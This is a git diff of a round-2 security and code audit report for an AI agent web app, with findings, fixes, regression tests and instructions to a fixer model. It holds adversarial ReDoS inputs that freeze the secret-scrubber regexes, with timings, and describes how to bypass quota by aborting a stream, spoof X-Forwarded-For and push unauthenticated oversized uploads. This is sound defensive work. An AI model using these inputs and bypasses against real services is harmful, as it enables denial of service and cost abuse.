@@ -1,810 +1,808 @@
-# NexusAgent: Full Codebase Audit Report
+# NexusAgent: Full Codebase Audit Report (Round 2)
 
-- **Date:** 2026-10-29
-- **Commit audited:** `a4e303d` (branch `master`, clean tree)
-- **Scope:** every tracked file: `apps/backend`, `apps/frontend`, `packages/contracts`, `migrations`, `scripts`, `knowledge_base`, `target/*.md`, root config, `.agents/rules`.
-- **Lenses:** security (OWASP Top 10 for Agentic AI, web), logic and correctness, UI/UX and accessibility, YAGNI / KISS / DRY / SOLID, dead and redundant code.
-- **No code was changed during this audit.**
+- **Date:** 2026-10-30
+- **Commit audited:** `ac1c4d9` (branch `master`, clean tree)
+- **Scope:** every tracked file: `apps/backend`, `apps/frontend`, `packages/contracts`, `migrations`, `scripts`, `knowledge_base`, `.agents/**`, `.github`, root config. Tests were skimmed for coverage gaps, not line-audited.
+- **Lenses:** security (web + OWASP Top 10 for Agentic AI), logic and correctness, UI/UX and accessibility, YAGNI / KISS / DRY / SOLID, dead and redundant code, CI/ops.
+- **No application code was changed.** Only this file was written. The previous `report.md` (round 1, commit `a4e303d`) was fully actioned in earlier commits (`SEC-01..14`, `LOG-*`, `UX-*`, `CLN-*`) and is replaced by this one. Its findings are **not** repeated here. Recover it with `git show HEAD:report.md` if needed.
 
 ---
 
 ## 0. How to use this report
 
-This report has two readers:
+Two readers:
 
-1. **Verifier:** re-check each finding against the code. Mark each one `CONFIRMED`, `REJECTED` (with reason) or `MODIFIED` (with the corrected fix).
-2. **Fixer:** apply confirmed findings **one ID per commit**, in the order given in §8.
+1. **Reviewer (human):** read §1 and §9 (decisions needed). Reject or change anything you disagree with.
+2. **Fixer (Gemini 3.8 Flash):** apply **one finding ID per commit**, in the order of §8. Do not batch. Do not touch anything outside the finding.
 
 Rules for the fixer:
 
-- Every finding has **Where**, **Problem**, **Fix** and **Verify**. Do the steps in **Fix**, then run **Verify** and the standard gates below. Do not mark anything done until the gates pass.
-- **Never edit an existing file in `migrations/`.** Applied migrations are immutable. Add a new file named `YYYYMMDDHHMMSS_description.sql` with a timestamp later than `20261101000200`.
-- When a fix deletes code, also delete or update the tests that only covered that code.
+- Each finding has **Where**, **Problem**, **Fix**, **Verify**. Do the **Fix** steps, then do **Verify**, then run the standard gates. Do not claim a finding is done until the gates pass.
+- Line numbers refer to commit `ac1c4d9` and will drift. **Search for the quoted symbol, not the line number.**
+- **Never edit an existing file in `migrations/`.** Applied migrations are immutable. Add a new file `YYYYMMDDHHMMSS_description.sql` with a timestamp later than `20261102000400` (the baseline's header says it squashes up to that version).
+- When a fix deletes code, delete or update the tests that only covered that code. When a fix changes an API response, run `pnpm contracts:generate` and commit the regenerated `packages/contracts/openapi.json` and `src/generated.ts`.
 - Add a regression test for every `SEC-*` and `LOG-*` fix.
-- Line numbers refer to commit `a4e303d`. They shift after earlier fixes, so search for the quoted symbol rather than trusting the number.
-- Older test names mention IDs such as `audit S-01` and `L-05`. Those come from a previous report that is no longer in the repo. The IDs in this report are new (`SEC-`, `LOG-`, `UX-`, `CLN-`, `DOC-`, `TST-`) and unrelated to them.
+- Keep the existing style: Python 3.14 (PEP 758 `except A, B:` is already used and valid), ruff line length 100, 4-space indent in TS, single quotes in TS, no new dependencies unless the finding says so.
+- Items marked **DECISION** in §9 need a human answer first. Do not implement them on your own.
+- IDs use the prefix `R2-` so they cannot be confused with the round-1 IDs that still appear in old commit messages and test names. Use `R2-SEC-01: <title>` as the commit subject.
 
 Standard gates (run after every commit):
 
 ```bash
 cd apps/backend && uv run pytest -q && uv run ruff check . && uv run ruff format --check .
-cd apps/frontend && pnpm test && pnpm typecheck && pnpm lint
+pnpm --filter @nexusagent/frontend typecheck && pnpm lint && pnpm format:check && pnpm --filter @nexusagent/frontend test
 ```
 
 Severity legend:
 
-| Severity   | Meaning                                                                |
-| ---------- | ---------------------------------------------------------------------- |
-| **High**   | Exploitable now, costs money, corrupts data, or breaks a core feature. |
-| **Medium** | Real defect or risk with a narrower trigger or impact.                 |
-| **Low**    | Hygiene, minor UX, or small risk.                                      |
+| Severity   | Meaning                                                                  |
+| ---------- | ------------------------------------------------------------------------ |
+| **High**   | Exploitable now, costs money, freezes the server, or breaks a core flow. |
+| **Medium** | Real defect or risk with a narrower trigger or impact.                   |
+| **Low**    | Hygiene, minor UX, small risk, or cleanup.                               |
 
 ---
 
 ## 1. Executive summary
 
-The codebase is tidy in places that matter. SQL is parameterised, document and conversation tenancy checks are correct, React escapes model output, and Mermaid SVG is sanitised. The serious problems sit in four areas:
+### Baseline measured during this audit (before any fix)
 
-1. **Cost controls can be bypassed.** MCP tool calls skip the quota entirely (SEC-01). Quota buckets are keyed by `(user_id, IP)`, so changing IP resets a user's quota (SEC-02). One upload token can trigger about 75 paid embedding calls and block the event loop (SEC-03).
-2. **Retrieval correctness.** The embedding service silently falls back across _different embedding models_ into the same vector index (LOG-04). Lexical search ANDs every query word, so it rarely matches (LOG-08). Citation line numbers are often wrong (LOG-07).
-3. **The product overstates what it does.** The token stream is replayed after the full LLM call finishes, so the displayed "first token" metric is false (LOG-01). The "critic" is a constant formula shown to users as a grounding score with "re-planning" (LOG-06). The docs and task board mark features as done that do not exist (DOC-01, DOC-02). The privacy policy makes claims the code contradicts (SEC-12). The project's own `AGENTs.md` forbids this ("Honesty Rule", "No Simulated Telemetry Rule", "Do not mark work done that does not exist on disk").
-4. **Readability and accessibility.** Answer text is 12px and much of the UI is 10–11px, against a design spec of 14px body text and a WCAG AAA claim (UX-01). Dark-mode primary buttons fail AA contrast at 3.68:1 (UX-02).
+| Check                          | Result                                                                                                                                                                       |
+| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `uv run pytest -q`             | 119 passed, **20 skipped** (all `@pytest.mark.db`; they only run when `TEST_DATABASE_URL` is set). 3 warnings.                                                               |
+| `uv run ruff check` / `format` | clean                                                                                                                                                                        |
+| `pnpm --filter ... typecheck`  | clean                                                                                                                                                                        |
+| `pnpm lint`                    | 6 warnings (`no-floating-promises` x3, `no-base-to-string` x3)                                                                                                               |
+| `pnpm format:check`            | **FAILS** on 5 files. **CI is red on `master`** (see R2-OPS-02).                                                                                                             |
+| `pnpm audit --prod`            | **38 vulnerabilities: 4 critical, 5 high, 20 moderate, 9 low** (`next@16.3.4`, `dompurify`, `katex`, `sharp`, `source-map-js`).                                              |
+| `pip-audit` (backend `.venv`)  | `pyjwt 2.13.0` (15 advisories), `pillow 12.3.0` (39), `aiohttp`, `certifi`, `dnspython`, `nltk`, `setuptools`, `opentelemetry-api`. See R2-SEC-08 for the venv-drift caveat. |
+| Secret scan of all 87 commits  | No real secrets. Only fixture strings in tests.                                                                                                                              |
 
-Top 10 to fix first: **SEC-01, SEC-02, SEC-03, LOG-04, LOG-01, LOG-02, LOG-03, SEC-04, LOG-09, UX-01.**
+### What is good (do not "fix" these; see Appendix A)
+
+Parameterised SQL everywhere, per-user tenancy checks, local Google ID-token verification, revocable sessions, atomic quota SQL, nonce CSP, Mermaid `securityLevel: 'strict'` plus DOMPurify, the canary hold-back streaming logic, append-only audit trigger.
+
+### Top problems
+
+1. **A 1 MB upload can freeze the whole API for minutes** (quadratic regexes in the secret scrubber, R2-SEC-01) and **unauthenticated clients can push unlimited bytes** (multipart is parsed before auth, R2-SEC-02).
+2. **Quota can be bypassed by aborting the stream** after retrieval/LLM work has started (R2-SEC-03).
+3. **Embedding provider failure turns an upload into a 500 and still charges quota** (R2-LOG-01). On the Gemini free tier this is a routine event.
+4. **Follow-up questions in a chat are refused as "out of scope"** because the scope guardrail ignores conversation history (R2-LOG-02). This breaks the headline multi-turn feature.
+5. **Dependencies are behind on critical advisories** (R2-SEC-08) and **CI is red** (R2-OPS-02).
+6. **Operational promises are not automated:** the privacy policy promises 24 h guest deletion and 30-day audit deletion, but nothing in the repo schedules the job (R2-OPS-01).
 
 ### Finding index
 
-| ID            | Sev    | Title                                                                                           |
-| ------------- | ------ | ----------------------------------------------------------------------------------------------- |
-| SEC-01        | High   | MCP `tools/call` bypasses quota (denial of wallet)                                              |
-| SEC-02        | High   | Quota bucket keyed by `(user_id, client_ip)`: IP rotation resets quota                          |
-| SEC-03        | High   | Upload cost amplification and event-loop blocking                                               |
-| SEC-04        | Medium | JWT in `localStorage` + CSP `'unsafe-inline'`; no revocation; endless refresh                   |
-| SEC-05        | Medium | Upload validation: extension OR client MIME, latin-1 accepts binary, long filename → 500        |
-| SEC-06        | Medium | MCP arguments are not schema-validated; unbounded input stored in audit log                     |
-| SEC-07        | Medium | Prompt-injection detection on the user query does nothing                                       |
-| SEC-08        | Medium | Google identity keyed on email, not `sub`; uses the `tokeninfo` endpoint                        |
-| SEC-09        | Low    | Unbounded in-memory sliding-window counters (memory growth)                                     |
-| SEC-10        | Low    | MCP results returned to external agents without untrusted-content wrapping                      |
-| SEC-11        | Low    | Production exposes `/docs`, `/openapi.json`, and DB version/extensions on `/api/health`         |
-| SEC-12        | Medium | Privacy policy and Terms contradict the code (retention, data use, "cryptographic isolation")   |
-| SEC-13        | Low    | Audit log "immutable" only by convention; raw prompts retained forever                          |
-| SEC-14        | Low    | CORS `allow_credentials=True` with no cookies; no throttling on auth/read endpoints             |
-| LOG-01        | High   | Fake streaming: full LLM call, then replayed in 3-word chunks; TTFT metric is false             |
-| LOG-02        | Medium | Conversation title is overwritten on every turn                                                 |
-| LOG-03        | Medium | `done` is sent before persistence; client refresh races; disconnect cancels the save            |
-| LOG-04        | High   | Embedding fallback mixes vector spaces of different models                                      |
-| LOG-05        | Medium | Citations: no format instruction; 5 cited but 3 used; fake pills; filename-substring matching   |
-| LOG-06        | Medium | "Critic" is a constant heuristic presented as reflection/re-planning                            |
-| LOG-07        | Medium | Chunk line numbers are wrong (first-occurrence search, scrub shifts)                            |
-| LOG-08        | Medium | Lexical search uses `plainto_tsquery` (AND); sequential; no degraded mode                       |
-| LOG-09        | Medium | Quota consumed before validation; never refunded on cancel/disconnect                           |
-| LOG-10        | Medium | stdio MCP server never connects to the DB; crashes on non-object JSON                           |
-| LOG-11        | Low    | History window magic numbers; guests silently get no multi-turn context                         |
-| LOG-12        | Low    | Scope classifier is easy to bypass and runs 3 times per request                                 |
-| LOG-13        | Medium | No way to delete a document, but the 409 error says "Delete a document first"                   |
-| LOG-14        | Medium | Starter prompts ask about models that are not in the knowledge base                             |
-| LOG-15        | Low    | `seed_kb.py` rotates document UUIDs each run; hash differs from upload path                     |
-| LOG-16        | Low    | Account switch within 8 s skips loading the new user's conversations                            |
-| LOG-17        | Low    | Audit `duration_ms=0` hard-coded; `conversation_id` never recorded                              |
-| LOG-18        | Low    | `save_message` and the user+assistant pair are not transactional                                |
-| LOG-19        | Medium | DB outage turns every authenticated request into an unhandled 500                               |
-| UX-01         | High   | Body text 12px, UI text 10–11px (spec: 14px body; AAA claimed)                                  |
-| UX-02         | Medium | Contrast: dark primary button 3.68:1 (fails AA); several tokens below the claimed 7:1           |
-| UX-03         | Low    | Skip link styled but never rendered                                                             |
-| UX-04         | Medium | Quota exhaustion opens a "Hire Me" sales modal instead of saying when quota resets              |
-| UX-05         | Medium | A citation cannot be opened; click only highlights a filename (and leaves the answer on mobile) |
-| UX-06         | Medium | Hand-rolled Markdown parser (no italics, nested lists, etc.)                                    |
-| UX-07         | Low    | Floating "New Chat" button overlaps the thread                                                  |
-| UX-08         | Low    | Internal jargon in end-user UI ("Executing DAG [PLANNER]", "RPC 200 OK", "MCP v2")              |
-| UX-09         | Low    | MCP Inspector tells users to supply a Bearer token they cannot obtain                           |
-| UX-10         | Low    | Inconsistent fetch layers: uploads/docs bypass `apiClient` (no 401 handling)                    |
-| UX-11         | Low    | Reloaded conversations lose citation pills                                                      |
-| UX-12         | Low    | Composer auto-grow relies on `field-sizing` (no Firefox / older Safari)                         |
-| CLN-01…CLN-12 | –      | Dead/redundant code and files to delete (§5)                                                    |
-| DOC-01…DOC-05 | –      | Documentation and spec drift (§6)                                                               |
-| TST-01…TST-05 | –      | Test-suite defects (§7)                                                                         |
+| ID        | Sev    | Title                                                                                 |
+| --------- | ------ | ------------------------------------------------------------------------------------- |
+| R2-SEC-01 | High   | Quadratic regexes in the secret scrubber freeze the server (ReDoS)                    |
+| R2-SEC-02 | High   | Request bodies are unbounded and parsed before authentication                         |
+| R2-SEC-03 | High   | Quota bypass: refund on client abort after work was done                              |
+| R2-SEC-04 | Medium | `get_current_user_optional` ignores session revocation                                |
+| R2-SEC-05 | Medium | Client-IP keying breaks behind a proxy (shared IP, or spoofable X-Forwarded-For)      |
+| R2-SEC-06 | Medium | Abuse counters, MCP sessions and upload locks live in process memory                  |
+| R2-SEC-07 | Medium | Upload limit and duplicate check are racy (no DB-level enforcement)                   |
+| R2-SEC-08 | Medium | Vulnerable dependencies (Next.js, DOMPurify, PyJWT, Pillow, ...)                      |
+| R2-SEC-09 | Low    | API response hardening: no `nosniff`/`no-store`, localhost in default production CORS |
+| R2-SEC-10 | Low    | HSTS `preload` and `includeSubDomains` hard-coded                                     |
+| R2-SEC-11 | Low    | Guest `deviceId` unbounded; weak fallback RNG for the device secret                   |
+| R2-SEC-12 | Low    | Markdown renderer relies on CSP alone to block image exfiltration                     |
+| R2-LOG-01 | High   | Upload: embedding failure is an unhandled 500 and quota is not refunded               |
+| R2-LOG-02 | Medium | Scope guardrail refuses follow-ups and many valid architecture questions              |
+| R2-LOG-03 | Medium | HNSW + `WHERE` filter can silently under-return rows                                  |
+| R2-LOG-04 | Medium | Chunk endpoints load every chunk with its embedding to return one                     |
+| R2-LOG-05 | Medium | Re-seeding changes chunk ids and breaks stored citations                              |
+| R2-LOG-06 | Medium | Conversation switch race: a slow response overwrites the newer selection              |
+| R2-LOG-07 | Medium | Persistence failure is invisible to the user                                          |
+| R2-LOG-08 | Low    | Quota read path duplicates and races the SQL replenish logic                          |
+| R2-LOG-09 | Low    | `last_seen_at` is written on every request (twice on `/auth/me`)                      |
+| R2-LOG-10 | Low    | `/api/rag/search` charges quota before validating input                               |
+| R2-LOG-11 | Low    | `/api/auth/refresh` is never called; sessions die silently after 24 h                 |
+| R2-LOG-12 | Low    | MCP: unknown or malformed tool names are charged, mis-audited, or 500                 |
+| R2-LOG-13 | Low    | `/api/health` runs three DB queries per unauthenticated call                          |
+| R2-LOG-14 | Medium | Missing indexes and constraints; dead `hitl_approved` column                          |
+| R2-UX-01  | Medium | Composer has no length limit or counter (server limit is 2000)                        |
+| R2-UX-02  | Medium | Expired session logs the user out with no explanation                                 |
+| R2-UX-03  | Medium | Mobile: quota hidden, `100vh` layout, `NaN%` quota bar                                |
+| R2-UX-04  | Low    | Signing in from a guest session silently abandons guest uploads                       |
+| R2-UX-05  | Low    | Accessibility noise: redundant roles, `!important` focus outline                      |
+| R2-UX-06  | Low    | End-user UI shows internal jargon and a wrong protocol label ("MCP v2")               |
+| R2-UX-07  | Low    | Arbitrary pixel values violate the project's own rule                                 |
+| R2-UX-08  | Low    | Theme toggle performs side effects inside a state updater                             |
+| R2-UX-09  | Low    | Chat search is title-only on the client while the server search is unused             |
+| R2-CLN-01 | Medium | Backend dead and redundant code (list)                                                |
+| R2-CLN-02 | Low    | Frontend dead code and unused exports (list)                                          |
+| R2-CLN-03 | Medium | Hand-written wire mappers (DRY): use a camelCase base model                           |
+| R2-CLN-04 | Low    | Message cache logic duplicated in four places                                         |
+| R2-CLN-05 | Low    | Graph topology duplicated in `routes/agent.py`                                        |
+| R2-CLN-06 | Medium | `generate_agent_stream` and route-to-route imports violate SRP/DIP                    |
+| R2-CLN-07 | Low    | `parser.py` duplicated chunk construction and double search                           |
+| R2-CLN-08 | Low    | Placeholder scaffolding files with `TODO` content                                     |
+| R2-CLN-09 | Low    | MCP resource table duplicated and incomplete                                          |
+| R2-CLN-10 | Low    | `seed_kb.py` duplicates the document insert SQL                                       |
+| R2-OPS-01 | Medium | Retention job (privacy promise) is not scheduled anywhere                             |
+| R2-OPS-02 | Medium | CI is red: `format:check` fails on 5 files; lint warnings                             |
+| R2-OPS-03 | Medium | CI skips every DB test unless a secret is present                                     |
+| R2-OPS-04 | Low    | CI hygiene: unpinned actions, no permissions, no audit job                            |
+| R2-OPS-05 | Low    | Application logging is not configured; `INFO` logs are dropped                        |
+| R2-DOC-01 | Low    | Documentation drift (Turborepo, pnpm version, test file names, stubs)                 |
+| R2-TST-01 | Medium | Missing tests for the riskiest frontend modules and for adversarial inputs            |
 
 ---
 
 ## 2. Security findings
 
-### SEC-01 · High · MCP `tools/call` bypasses quota (denial of wallet)
+### R2-SEC-01 · High · Quadratic regexes in the secret scrubber freeze the server (ReDoS)
 
-- **Where:** `apps/backend/app/routes/mcp.py:48-84` (`POST /api/mcp/v1`) and `:145-205` (`POST /api/mcp/messages`); `apps/backend/app/mcp/dispatch.py:41-51`; `apps/backend/app/mcp/registry.py:140-233`.
-- **Problem:** Every other paid path (`/agent/stream`, `/rag/search`, `/documents/upload`) calls `default_rate_limiter.check_and_consume`. The MCP routes do not. `hybrid_rag_search` calls the Gemini embedding API once per call (`hybrid_search.py:178`).
-- **Impact:** Any guest (free, one click) can loop `tools/call` and spend the Gemini budget without limit. This breaks ASI-07.
+- **Where:** `apps/backend/app/core/security_guardrails.py`, `SECRET_PATTERNS` (private key, JWT, database URI entries). Called from `app/rag/parser.py::parse_markdown` on the **entire** uploaded text, and from `sanitize_retrieved_chunks`.
+- **Problem:** Three patterns scan to the end of the run from every possible start position, so adversarial text is O(n²). Python's `re` holds the GIL, and `asyncio.to_thread` does not help, so the event loop stops serving every other request. Measured on this machine with `scrub_sensitive_information`:
+
+    | Input (repeated string)            | 40 KB  | 80 KB  | extrapolated to the 1 MB upload limit |
+    | ---------------------------------- | ------ | ------ | ------------------------------------- |
+    | `"eyJ-"` (JWT pattern)             | 0.30 s | 1.21 s | **~3.5 minutes**                      |
+    | `"postgres://a:"` (DB URI pattern) | 0.68 s | 2.54 s | **~7 minutes**                        |
+    | `"-----BEGIN PRIVATE KEY-----"`    | 0.21 s | 0.89 s | **~2.5 minutes**                      |
+
+    Any signed-in user (a guest is enough) can upload such a file. The quota cost is one token.
+
+- **Fix:** Replace the three entries (keep the replacement strings unchanged). Every quantifier is bounded, and a lookbehind makes matching start only at the beginning of a token, so the work is linear:
+
+    ```python
+    # Private key: the body may not contain "--", so a stray BEGIN header cannot scan to the end of the file.
+    (
+        re.compile(
+            r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"
+            r"(?:[^-]|-(?!--)){0,16384}?"
+            r"-----END (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"
+        ),
+        "[REDACTED_PRIVATE_KEY]",
+    ),
+    # JWT: only start at the beginning of a token, bounded segments.
+    (
+        re.compile(
+            r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,8192}"
+            r"\.[A-Za-z0-9_-]{10,8192}\.[A-Za-z0-9_-]{10,8192}(?![A-Za-z0-9_-])"
+        ),
+        "[REDACTED_JWT_TOKEN]",
+    ),
+    # Database URI with credentials: bounded user and password.
+    (
+        re.compile(
+            r"(?<![A-Za-z0-9])(postgresql|postgres|mysql|mongodb|redis)://"
+            r"([^:\s@/]{1,128}):([^@\s]{1,256})@"
+        ),
+        r"\1://\2:[REDACTED_PASSWORD]@",
+    ),
+    ```
+
+    I benchmarked these exact shapes at 1 MB of adversarial input: JWT 0.01 s, DB URI 0.23 s, private key 0.004 s. Leave the other patterns alone (measured linear).
+
+- **Verify:** Add `apps/backend/tests/test_scrubber_performance.py`:
+
+    ```python
+    import time
+
+    import pytest
+
+    from app.core.security_guardrails import scrub_sensitive_information
+
+    ADVERSARIAL = {
+        "jwt": "eyJ-" * 262_144,
+        "dburi": "postgres://a:" * 80_000,
+        "privkey": "-----BEGIN PRIVATE KEY-----" * 38_000,
+        "sk": "sk-" * 350_000,
+    }
+
+
+    @pytest.mark.parametrize("name", ADVERSARIAL)
+    def test_scrubber_is_linear_on_adversarial_input(name):
+        started = time.perf_counter()
+        scrub_sensitive_information(ADVERSARIAL[name], preserve_lines=True)
+        assert time.perf_counter() - started < 2.0
+    ```
+
+    The existing redaction tests (`test_security_hitl.py`, `test_documents.py`) must still pass: a real JWT, an RSA key block, an `AKIA...` key and `postgresql://admin:pw@host/db` are still redacted, and `preserve_lines=True` still keeps the newline count.
+
+### R2-SEC-02 · High · Request bodies are unbounded and parsed before authentication
+
+- **Where:** `apps/backend/app/main.py` (no body-size middleware), `app/routes/documents.py::upload_document` (the 1 MB check happens after Starlette has already received and spooled the whole multipart body).
+- **Problem:** FastAPI parses the form body **before** it resolves `Depends(get_current_user)`. Verified with a probe: a 5 MB unauthenticated multipart POST returned `401` only after `['body-parsed', 'auth']` ran in that order. An anonymous client can stream gigabytes into the server's memory/temp disk. The later `file.read(MAX_FILE_BYTES + 1)` does not help.
+- **Fix:** Add a pure-ASGI middleware `app/core/body_limit.py` and register it in `main.py` **before** `CORSMiddleware`.
+    1. Limits: `POST /api/documents/upload` -> `1_048_576 + 16_384` bytes; every other path -> `65_536` bytes. Put the table in `settings` (`MAX_UPLOAD_REQUEST_BYTES`, `MAX_JSON_REQUEST_BYTES`).
+    2. If `Content-Length` is present and larger than the limit, answer `413 {"detail": "Request body too large"}` without calling the app. If it is not an integer, answer `400`.
+    3. For chunked bodies (no `Content-Length`), wrap `receive`, add up `len(message.get("body", b""))` for `http.request` messages, and when the total passes the limit raise an internal exception that the middleware turns into the same `413` (only if the response has not started).
+    4. Only handle `scope["type"] == "http"`; pass everything else through.
+    5. Use `status.HTTP_413_CONTENT_TOO_LARGE` (the old constant is deprecated; see R2-TST-02).
+    6. Document in `README.md` (Deployment) that the reverse proxy should also cap bodies (for example Cloudflare or nginx `client_max_body_size 2m`).
+- **Verify:** New `tests/test_body_limit.py` (no DB needed): (a) unauthenticated POST of 3 MB to `/api/documents/upload` returns `413`, and `MultiPartParser.parse` was never called (monkeypatch it to record calls); (b) a chunked 3 MB body (httpx streaming generator) returns `413`; (c) a 100 KB JSON body to `/api/agent/stream` returns `413`; (d) a normal 200 KB upload still reaches the handler.
+
+### R2-SEC-03 · High · Quota bypass: refund on client abort after work was done
+
+- **Where:** `apps/backend/app/routes/agent.py::generate_agent_stream`, `run_pipeline` -> `except asyncio.CancelledError` (`if not tokens_sent: await refund_if_charged()`), and the generic `except Exception` branch.
+- **Problem:** The token is refunded when the client disconnects before the first model token. By then the server has already run the planner, the **embedding API call**, two database searches, an audit write, and has started the Gemini request. A script that opens `/api/agent/stream`, waits for the `tool_result` event, and closes the connection gets the work for free, indefinitely. Guests are protected by the separate per-IP counter, but **Google users have no other limiter**, so their 25/hour quota is meaningless against this.
 - **Fix:**
-    1. Pass the authenticated `User` and the client IP into `dispatch_mcp_method` (replace the `user_id` parameter with `user: User | None, client_ip: str | None`).
-    2. In the `tools/call` branch, before `call_tool`, call `await default_rate_limiter.check_and_consume(user.id, client_ip, is_guest=user.is_guest)` when `user` is set. Convert the 429 `HTTPException` into a JSON-RPC error (`code=-32000`, `message="Quota exhausted. It replenishes hourly."`) instead of letting it escape.
-    3. The stdio server (`mcp/server.py`) is a local, trusted process. Keep it unmetered and document that.
-- **Verify:** New test: a guest makes 6 `tools/call` requests to `/api/mcp/v1`. The 6th returns a JSON-RPC error and the embedding service mock is called at most 5 times.
+    1. In `except asyncio.CancelledError`, **remove** the refund. Keep only `logger.info` and `raise`.
+    2. In `except Exception` keep the refund only `if not tokens_sent` (a server fault before any output).
+    3. In the `final_state.error` branch keep the refund only `if not tokens_sent`. Errors such as "no model configured" or "all models rate limited" happen before any output, so they stay refundable.
+    4. Update the comment above the cancel branch to say why (retrieval and the model call may already have run).
+- **Verify:** Add a test next to `tests/test_agent_stream.py`: start the stream with a fake graph that emits `tool_result`, cancel the generator, assert the user's remaining quota is **one lower** than before. Keep (or add) a test that a pre-work server error still refunds.
 
-### SEC-02 · High · Quota bucket keyed by `(user_id, client_ip)`: IP rotation resets quota
+### R2-SEC-04 · Medium · `get_current_user_optional` ignores session revocation
 
-- **Where:** `migrations/20260901000000_core_schema.sql:28-36` (`CONSTRAINT unique_user_ip UNIQUE (user_id, client_ip)`); `apps/backend/app/db/neon.py:190-258`; `apps/backend/app/core/rate_limiter.py:63-149`.
-- **Problem:** Each new IP gets a fresh full bucket for the same user. A Google user (25/h) has no IP limiter at all. Guests are bounded per IP (15/h), but rotating IPs (mobile network, VPN, proxy pool) bypasses both limits. Quota reads also do two round trips (`get_or_create_rate_limit` then `decrement_rate_limit`) where one would do.
+- **Where:** `apps/backend/app/core/auth.py`, `get_current_user_optional` (used by `GET /api/documents`).
+- **Problem:** `get_current_user` rejects tokens whose `tv` (token version) no longer matches, so logout revokes the session. The optional variant skips that check, so a token that was signed out still returns the user's private document list (filenames, hashes, ids). Two code paths also duplicate the decode-and-load logic.
+- **Fix:** Extract one helper and use it in both dependencies:
+
+    ```python
+    async def _resolve_user(credentials: HTTPAuthorizationCredentials, db: NeonDatabase) -> User:
+        # body of today's get_current_user up to and including the token_version check; raises HTTPException(401)
+        ...
+
+    async def get_current_user(credentials=Security(security_bearer), db=Depends(get_db)) -> User:
+        if not credentials:
+            raise HTTPException(401, ...)          # keep the existing detail and headers
+        user = await _resolve_user(credentials, db)
+        await db.touch_user(user.id)               # see R2-LOG-09; until then keep update_user_last_seen
+        return user
+
+    async def get_current_user_optional(credentials=Security(security_bearer), db=Depends(get_db)) -> User | None:
+        if not credentials:
+            return None
+        try:
+            return await _resolve_user(credentials, db)
+        except HTTPException:
+            return None
+    ```
+
+- **Verify:** Test: sign in as a guest, upload a document, call `POST /api/auth/logout`, then `GET /api/documents` with the old token. Expect only seeded documents (the user's upload must not be listed).
+
+### R2-SEC-05 · Medium · Client-IP keying breaks behind a proxy
+
+- **Where:** `apps/backend/app/core/auth.py::get_client_ip`, `app/config.py::TRUST_PROXY_HEADERS`, `.env.example`.
+- **Problem:** Two failure modes. (a) With the default `TRUST_PROXY_HEADERS=false` behind any reverse proxy or Cloudflare (the privacy page says Cloudflare is used), every user has the proxy's IP, so the guest limits (`GUEST_SIGNUPS_PER_IP_PER_HOUR=5`, `GUEST_IP_QUOTA_PER_HOUR=15`) become **global**: the sixth visitor in an hour cannot get a guest pass. (b) With `true`, the code takes the **left-most** `X-Forwarded-For` entry, which is the part the client controls, so rotating the header evades every IP limit.
+- **Fix:** Replace the boolean with a hop count and take the entry the trusted proxy added:
+    1. `settings.TRUSTED_PROXY_HOPS: int = 0` (remove `TRUST_PROXY_HEADERS` and update `.env.example`, README, tests).
+    2. In `get_client_ip`: if `hops > 0`, split `X-Forwarded-For` on `,`, strip, and return `parts[-hops]` when `len(parts) >= hops`; otherwise fall back to the socket address. Never use `parts[0]`.
+    3. Log one `WARNING` at startup when `ENVIRONMENT` is not dev and `TRUSTED_PROXY_HOPS == 0`: "IP-based limits use the socket address; set TRUSTED_PROXY_HOPS if you run behind a proxy."
+- **Verify:** Update `tests/test_security_hardening.py`: with `hops=1` and header `"1.1.1.1, 9.9.9.9"` the IP is `9.9.9.9`; with `hops=2` it is `1.1.1.1`; with `hops=0` the header is ignored; a short header with `hops=3` falls back to the socket IP.
+
+### R2-SEC-06 · Medium · Abuse counters, MCP sessions and upload locks live in process memory
+
+- **Where:** `app/core/rate_limiter.py` (`SlidingWindowCounter` x4), `app/routes/mcp.py::SESSIONS`, `app/routes/documents.py::_UPLOAD_LOCKS`, `app/agent/model_router.py`.
+- **Problem:** With more than one worker or instance every per-IP limit multiplies by the worker count, MCP `POST /messages` can land on a worker that does not hold the SSE session (404), and the upload lock stops protecting anything. The README says "run a single process" but nothing enforces it, and `uvicorn --workers N` or a platform autoscaler silently breaks the limits. See **DECISION D3** in §9.
+- **Fix (minimum, always do this):** In `main.py::lifespan`, read `os.environ.get("WEB_CONCURRENCY")`; if it is set and `> 1`, raise `RuntimeError("NexusAgent keeps abuse counters and MCP sessions in memory; run exactly one worker (see README).")` in production. Add the same sentence to `README.md` -> Deployment.
+- **Fix (if D3 = "make it stateless"):** Replace `SlidingWindowCounter` with one table and one SQL statement (also deletes the `MAX_TRACKED_KEYS` pruning code):
+
+    ```sql
+    CREATE TABLE ip_rate_events (
+        bucket TEXT NOT NULL, key TEXT NOT NULL, window_start TIMESTAMPTZ NOT NULL, hits INT NOT NULL DEFAULT 0,
+        PRIMARY KEY (bucket, key, window_start)
+    );
+    ```
+
+    ```python
+    async def hit_ip_limit(self, bucket: str, key: str, limit: int) -> bool:
+        row = await conn.fetchval(
+            "INSERT INTO ip_rate_events (bucket, key, window_start, hits) VALUES ($1, $2, date_trunc('hour', NOW()), 1) "
+            "ON CONFLICT (bucket, key, window_start) DO UPDATE SET hits = ip_rate_events.hits + 1 RETURNING hits;",
+            bucket, key)
+        return row <= limit
+    ```
+
+    Delete rows older than 2 hours inside `scripts/prune_guests.py`. Tests: replace the in-process fixtures accordingly.
+
+- **Verify:** Unit test for the `WEB_CONCURRENCY` guard (production + `WEB_CONCURRENCY=2` raises; dev does not). If the DB version was done: a `db` test that the 6th hit in the same hour returns `False`.
+
+### R2-SEC-07 · Medium · Upload limit and duplicate check are racy
+
+- **Where:** `apps/backend/app/routes/documents.py::upload_document` (`count_user_documents` then insert; `get_document_by_hash` then insert), `_get_upload_lock`, `migrations/`.
+- **Problem:** The per-user `asyncio.Lock` is per process (R2-SEC-06) and the DB enforces nothing: two concurrent requests can pass the `MAX_DOCUMENTS_PER_USER` check together, and the same file can be stored twice because there is no unique index on `(user_id, sha256_hash)`.
 - **Fix:**
